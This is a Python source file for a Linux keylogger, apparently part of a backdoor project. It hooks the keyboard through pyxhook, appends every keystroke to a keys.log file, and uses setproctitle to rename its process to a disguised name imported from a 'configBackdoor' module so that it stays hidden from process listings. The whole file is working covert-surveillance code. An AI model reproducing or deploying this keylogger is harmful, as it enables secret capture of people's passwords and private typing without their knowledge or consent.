import os
import pyxhook
import configBackdoor
import setproctitle

def OnKeyPress(event):
	with open(log_file, 'a') as f:
		f.write('{}\n'.format(event.Key))

def keylogger():
    try:
        with open(log_file, 'w+') as f:
            f.write('Starting Keylogger...\n')

        if os.environ.get('pylogger_clean', None) is not None:
            try:
                os.remove(log_file)
            except EnvironmentError:
                pass

        new_hook = pyxhook.HookManager()
        new_hook.KeyDown = OnKeyPress
        new_hook.HookKeyboard()
        try:
            new_hook.start()
        except KeyboardInterrupt:
            pass
        except Exception as ex:
            msg = 'Error while catching events:\n {}'.format(ex)
            pyxhook.print_err(msg)
            with open(log_file, 'a') as f:
                f.write('\n{}'.format(msg))
    except Exception as e:
        pass

if __name__ == "__main__":
    processName = configBackdoor.processName3
    setproctitle.setproctitle(processName)
    log_file = os.environ.get(
        'pylogger_file',
        os.path.expanduser('./keys.log')
    )
    keylogger()